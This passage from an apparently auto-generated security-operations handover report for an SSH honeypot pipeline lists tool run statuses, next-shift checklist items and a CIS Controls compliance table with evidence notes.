| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (8.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 195 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T14:29:07Z_
